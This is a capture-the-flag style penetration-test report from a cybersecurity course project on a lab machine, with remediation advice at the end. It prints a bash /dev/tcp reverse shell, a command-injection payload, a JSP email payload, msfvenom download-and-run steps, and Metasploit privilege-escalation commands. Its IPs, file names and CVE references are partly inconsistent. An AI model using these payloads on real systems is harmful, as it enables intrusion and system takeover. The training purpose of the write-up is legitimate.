---
title: "Atrium - Final Project"
excerpt: "A detailed report on the final project for the Atrium Cybersecurity Master, covering reconnaissance, exploitation, and privilege escalation on a vulnerable machine."
seo_description: "A complete penetration testing analysis and write-up of the Atrium CyberAcademy ethical hacking final project, documenting exploitation and root escalation."
categories:
  - Report
  - Ethical-Hacking
  - write-up
tags:
  - pentesting
  - cybersecurity
  - metasploit
  - RCE
  - Hacking-WEB
toc: true
toc_label: "Table of Contents"
toc_sticky: true
header:
  overlay_image: /assets/images/headers/atrium-project-banner.jpg
  overlay_filter: 0.7
  og_image: /assets/images/headers/atrium-project-banner.jpg
---

![image-center](/assets/images/headers/atrium-project-banner.jpg)
{: .align-center}

**Skills Demonstrated**
- **Reconnaissance & Scanning**: Nmap scanning, service and version enumeration.    
- **Initial Access**: Client-side credential bypass, OS command injection via web form.    
- **Shells & Post-Exploitation**: Netcat reverse shell, Meterpreter session setup, TTY shell upgrade.  
- **Privilege Escalation**: Kernel exploit (`4.4.0-87-generic`), local exploit enumeration with `Metasploit`, hash cracking (`/etc/shadow`).
  
- **Tools**: Nmap, cURL, Netcat, Metasploit Framework, MSFvenom, Python HTTP Server. {: .notice--primary}
    

---

# 1. Executive Summary

This report documents the findings of a penetration test conducted on a vulnerable machine as part of the Atrium CyberAcademy's final project. The primary objective was to simulate a real-world engagement by following a standard methodology to identify and exploit security vulnerabilities.

The assessment successfully identified several critical flaws, including **hardcoded credentials**, a **client-side bypass**, and **OS command injection (RCE)**. These vulnerabilities led to a full system compromise, starting with a low-privileged shell and culminating in a successful **privilege escalation to `root`**. The findings confirm that the system contains multiple security misconfigurations and outdated software versions that pose a severe risk.

The following report details the technical steps taken to exploit the machine, analyzes the impact of each vulnerability, and provides actionable recommendations to remediate the identified risks.

---

# 2. Project Introduction

This report documents the entire process of an ethical hacking exercise conducted as the final project for the cybersecurity master's program at Atrium CyberAcademy. The main objective was to simulate a real-world penetration testing scenario, applying a structured methodology to identify, analyze, and exploit vulnerabilities in a controlled environment.

The project was divided into key phases:

1. **Reconnaissance and Scanning:** Discovering the network topology and active services on the target machine.
    
2. **Vulnerability Analysis and Exploitation:** Identifying weaknesses in the services and executing controlled tests to gain initial access.
    
3. **Post-Exploitation and Privilege Escalation:** Searching for sensitive information, exploring the system, and escalating privileges to `root` to achieve full control of the machine.
    

The purpose of this report is to detail each step of the process, highlight critical findings, and share lessons learned, demonstrating the practical application of the knowledge acquired throughout the program.

> **Project Objective:** To perform reconnaissance, scanning, and identify potential vulnerabilities in a selected organization, and then execute controlled tests on a vulnerable machine. **Target Machine:** [Target Machine Atrium](https://mega.nz/file/4O0w3Tza#fGAUjHzRiGNmJY8Wlu9Mw3pC5ysP-P-nnBjvJVGTfqE) 

---
![image-center](/assets/images/posts/atrium-report/atrium-project.png)
{: .align-center}
# 3. Phase 1 – Reconnaissance and Scanning

### Network Configuration and Discovery

The first step was to establish connectivity and identify the target machine within the network.

- **Attacker Machine:** Kali Linux (IP: `192.168.1.13/24`)
    
- **Victim Machine:** (IP: `192.168.1.21/24`)
    
- **Network:** Bridge (both machines are on the same local network)

![Successful ping test](/assets/images/posts/atrium-report/ping-test.png){: .align-center}
![Netdiscover result 2](/assets/images/posts/atrium-report/netdiscover-2.png){: .align-center}


A successful ping between the Kali machine and the victim confirmed network connectivity. 

The `netdiscover` scan allowed us to identify the target machine on the network. 

![Netdiscover result 1](/assets/images/posts/atrium-report/netdiscover-1.png){: .align-center}

#### Port and Service Scanning with Nmap

A comprehensive Nmap scan was performed to identify all open ports, running services, and the operating system of the target. 
![Basic Nmap scan](/assets/images/posts/atrium-report/nmap-basic-scan.png){: .align-center}

#### Detected Operating System:

The scan identified the following OS with high confidence:

|System|Approximate Version|Detection Method|Confidence|
|---|---|---|---|
|Linux|3.2 - 4.14|Nmap OS Detection|✅ 100%|

Exportar a Hojas de cálculo

#### Identified Services and Findings:

The following table summarizes the most interesting services found during the scan.

|Port|Service|Product & Version|Potential|
|---|---|---|---|
|**21**|FTP|`vsftpd 3.0.3`|Anonymous access (`flag.txt` visible)|
|**25**|SMTP|`JAMES smtpd 2.3.2.1`|**Highly vulnerable** to RCE|
|**80**|HTTP|`Apache 2.4.18 (Ubuntu)`|Fuzzing (`/cyberacademy`)|
|**110**|POP3|`JAMES pop3d 2.3.2.1`|Brute-force credentials|
|**119**|NNTP|`JAMES nntpd`|Investigable|



## **Relevant Observations:**

- The **FTP service allows anonymous login** and contains a `flag.txt` file, which indicates a potential unauthenticated entry point.
    
- The **Apache James server** is running three key services (SMTP, POP3, and NNTP) with **known vulnerabilities in version 2.3.2.1**, potentially allowing:

    - User creation via telnet
    - Command injection through emails 
    - Possible Remote Code Execution (RCE)
        
- The HTTP server has a `robots.txt` file that **restricts `/cyberacademy`**, which is a clear clue for targeted analysis (often pointing to sensitive directories or test environments).
    
- The operating system was identified as **Linux**, with a kernel version range between 3.2 and 4.14, commonly found in distributions such as Ubuntu 16.04 or similar.

---

## 4. Phase 2 - Vulnerability Analysis and Exploitation

### Attack Vector Selection

Based on the reconnaissance findings, a strategic approach was devised to exploit the most promising vulnerabilities.

|Service|Key detail|Possible attack vector|
|---|---|---|
|**FTP (21)**|vsftpd 3.0.3 — Anonymous login enabled|Direct access; possible information leak (`flag.txt`)|
|**SMTP (25)**|Apache James Server 2.3.2.1|Known CVE, allows remote execution with created accounts|
|**POP3 (110)**|James 2.3.2.1|Collect emails with credentials created via telnet|
|**NNTP (119)**|James nntpd|Possible abuse or message harvesting|
|**HTTP (80)**|Apache 2.4.18 (Ubuntu), `/cyberacademy`|Scan with Gobuster, Nikto; possible hidden scripts or paths|
|**SSH (22)**|OpenSSH 7.2p2|Brute force if user leaks are found|

Exportar a Hojas de cálculo

### Exploitation of Apache James Server 2.3.2.1 (SMTP / POP3)

The goal of this exploitation was to demonstrate a **Remote Code Execution (RCE)** in **Apache James Server 2.3.2.1** by abusing its email sending and receiving logic. The attack leveraged three exposed services:
- *Port 4555:* James administration console.    
- *Port 25:* **SMTP** service (sending emails).    
- *Port 110:** **POP3* service (receiving emails).
    

The attack involved sending a malicious email containing a JSP payload, which would later be processed by the James server. This allows code injection and remote execution.

**Malicious Email:**

```bash
HELO kali
MAIL FROM:<hola@localhost>
RCPT TO:<hola@localhost>
DATA
From: evil
Subject: exploit test
<%
Runtime.getRuntime().exec("touch /tmp/pwned.txt");
%>
.
QUIT
```

**Expected Outcome:** The execution of this payload creates the file `/tmp/pwned.txt` on the target server, proving the ability to execute arbitrary commands remotely.
![Successful ping test](/assets/images/posts/atrium-report/telnet-conect.png)

### Web Application Vulnerabilities

#### Vulnerable Panel — `/login_1/`

- **Location:** `http://192.168.0.1X/login_1/`
    
- **Vulnerability:** This login panel relies on **client-side JavaScript** for credential validation. The username (`admin`) and password (`supersecret`) were hardcoded and easily visible in the page source.

![Captured Flag](/assets/images/posts/atrium-report/flag1.png )

### Critical Vulnerability — `/login_2/`

- **Location:** `http://192.168.0.1X/login_2/`
    
- **Vulnerability:** When a **POST** request with invalid credentials was submitted, the server responded with an **HTTP 200 OK** and directly disclosed the flag in the response body. This allowed a bypass of the login mechanism without a valid username or password.

`curl -X POST http://192.168.0.18/login_2/index.php -d "login=admin&password=test" -i`

**Response:** `FLAGH{BYPASSING_HTTP_METH=DS_G00D!}`

![Captured Flag](/assets/images/posts/atrium-report/flag2.png )

### False Positives Detected

During the assessment, some potential attack vectors were identified but proved to be dead ends. Documenting these is a key part of a professional report.

|Service / Endpoint|Initial Finding Description|Tests Performed|Result|
|---|---|---|---|
|Reverse Shell SMTP|Attempted reverse shell via payload in email|Tried multiple bash and Meterpreter payloads; no connection established|No session established, likely a false positive|
|Login /login_2/|Attempted access with basic credentials (admin:1234)|Tested multiple credentials and Authorization header with base64|Failed; however, flag found using POST method (HTTP method bypass)|
|Gobuster on /login_2|401 errors and length-based blocking during scan|Tried excluding status codes and lengths with Gobuster; found nothing|Result indicates no accessible hidden directories|


### OS Command Injection — `/ping/`

- **Location:** `http://192.168.0.1X/ping/`
    
- **Vulnerability:** This functionality allows a user to enter an IP address to perform a ping. The endpoint is vulnerable to **OS Command Injection** due to a complete lack of input validation and sanitization.
    
- **Proof of Concept:** The payload `127.0.0.1; ls` was entered into the ping input field, and the server's response included the output of the `ls` command.
    

### Exploiting the `/ping/` Endpoint

The goal of this exploitation was to obtain a **reverse shell** by leveraging the `/ping/` form parameter.

- **Initial Tests:** Initial attempts with a standard bash reverse shell (`127.0.0.1; bash -i >`) were unsuccessful, likely due to filtering of special characters like `>`, `&`, and `"`.

![RCE vulneravility find](/assets/images/posts/atrium-report/vuln-rce.png)
    
- **Solution: URL-Encoded Payload:** To bypass the filtering, a classic bash reverse shell payload was **URL-encoded**.
    
    - **Original Payload:**
    ```bash
    bash -i >& /dev/tcp/192.168.0.16/4444 0>&1
    ```
    
    - **Functional Payload:**
    ```
    127.0.0.1; bash+-c+%22bash+-i+%3E%26+/dev/tcp/192.168.0.19/4444+0%3E%261%22
    ```
    
- **Listener Preparation:** A Netcat listener was set up on the Kali machine to catch the incoming connection.
    ```bash
    nc -nlvp 4444
    ```
    
- **Result:** The reverse connection was successfully established, and a remote shell from the victim machine was obtained.
![System acces granted](/assets/images/posts/atrium-report/reverseshell.png )

### Interactive Shell (TTY) Treatment

The initial remote shell was non-interactive. To gain a fully functional and stable TTY, the following steps were performed:

1. **Upgrade the shell with `script`**: `script /dev/null -c bash`
    
2. **Background the shell and reattach**: After pressing `Ctrl + Z`, the shell is put in the background. `stty raw -echo` disables local echoing, and `fg` brings the shell back to the foreground with a fully interactive TTY.
    
3. **Adjust terminal settings**: `reset`, `export TERM=xterm`, `export SHELL=bash`
    
4. **Set console dimensions**: `stty size` followed by `stty rows <rows_value> columns <columns_value>`.
    

### Upgrading the Shell with MSFvenom

To transition to a more powerful **Meterpreter session**, a payload was generated using **MSFvenom** and transferred to the victim machine.

```bash
# Payload Generation on Kali
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.0.21 LPORT=4444 -f elf > s.elf
# Transfer and Execution on the victim
cd /tmp
wget http://192.168.0.21:8000/shell.elf
chmod +x shell.elf
./s.elf
```

![System acces granted](/assets/images/posts/atrium-report/reverseshell1.png )
### Payload Execution Metasploit

A listener was set up on the attacking machine using **Metasploit's `multi/handler` module** to catch the reverse shell.
```bash
msfconsole
use exploit/multi/handler
set PAYLOAD linux/x86/meterpreter/reverse_tcp
set LHOST <attacker_IP>
set LPORT 4444
run -j
```
Once executed on the victim, the handler caught the connection, and a **Meterpreter session** was successfully established.

![System acces granted](/assets/images/posts/atrium-report/startmsf.png )

![System acces granted](/assets/images/posts/atrium-report/startmsf1.png )

---

## 5. Phase 3: Post-Exploitation and Privilege Escalation

### Initial Context

The primary goal was to escalate privileges from the low-privileged `www-data` user to `root`.

- **Initial Access**: Meterpreter session
    
- **Compromised User**: `www-data`
    
- **Operating System**: Ubuntu 16.04
    
- **Kernel**: `4.4.0-87-generic`
    

### Enumeration with LinPEAS and PSPY

To identify potential privilege escalation vectors, tools like **LinPEAS** and **PSPY** were used. Key findings included:

- A user hash for `deloitte` was found in `/etc/shadow`.
    
- The `/opt/james-2.3.2.1/bin/run.sh` script was being executed automatically. However, since it uses absolute paths, a `PATH` hijacking attack was not feasible.
    
![Running LinPEAS](/assets/images/posts/atrium-report/pspy1.png)

### Attempt to Crack Hashes

The hash for the `deloitte` user was copied from `/etc/shadow` and passed to **John the Ripper** with a wordlist attack. **Hash:** `deloitte:xxxxxWnCp/$jCaUM7F57.NTzp60E2x2d/:17507:0:99999:7:::`

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt shadow.txt
```
![Showing `run.sh`](/assets/images/posts/atrium-report/phoenix-run.png)

This is a standard procedure to obtain plaintext passwords and gain access to other accounts.

### Final Phase: Privilege Escalation to Root
![Meterpreter acces](/assets/images/posts/atrium-report/pwed.png )
The final objective was to gain **root** privileges on the victim machine by exploiting a known local vulnerability.

- **Exploit Execution:** Based on the previous enumeration, the `exploit/linux/local/bpf_sign_extension_priv_esc` module was chosen as it affects the identified kernel version.
    

```bash
use exploit/linux/local/bpf_sign_extension_priv_esc
set SESSION 1
set LHOST <local_IP/tun0>
set LPORT 4445
set PAYLOAD linux/x64/meterpreter/reverse_tcp
run
```

![Acces root](/assets/images/posts/atrium-report/root.png )
- **Result:** The exploit was successful, and a new **meterpreter session** with **root** privileges was obtained. This confirmed a complete system compromise.


---

## 6. Conclusion and Remediation

### Vulnerability Summary
The penetration test successfully identified and exploited multiple critical vulnerabilities.

Vulnerability	CVE / Reference	Severity	Impact
Command Injection (RCE)	N/A	Critical	An unauthenticated attacker can execute arbitrary code on the system.
Outdated Software	CVE-2007-6283 (James)	High	The vulnerable Apache James server allowed potential RCE.
Hardcoded Credentials	N/A	Medium	Exposed credentials in client-side code grant unauthorized access.
Kernel Privilege Escalation	CVE-2017-15265	Critical	A low-privileged user can gain full root access to the system.
Anonymous FTP Access	N/A	Low	Allows information disclosure, such as the initial flag.txt file.

### Remediation & Recommendations

To mitigate the identified risks and improve the overall security posture, the following recommendations are provided.

- **Patch and Update Services**: Immediately update the Apache James server to a non-vulnerable version. All other software and the operating system kernel should also be patched to the latest stable versions.
    
- **Validate User Input**: Implement strict server-side validation and sanitization for all user-submitted data to prevent command injection and other forms of code execution.
    
- **Secure Web Applications**: Remove hardcoded credentials from public-facing code. All authentication should be handled securely on the server-side, and sensitive data should not be returned in HTTP responses.
    
- **Disable Unused Services**: Restrict anonymous access to the FTP server. If FTP is not essential, consider disabling it to reduce the attack surface.
    
- **Principle of Least Privilege**: Ensure that all services and applications run with the minimum level of privileges required to perform their functions.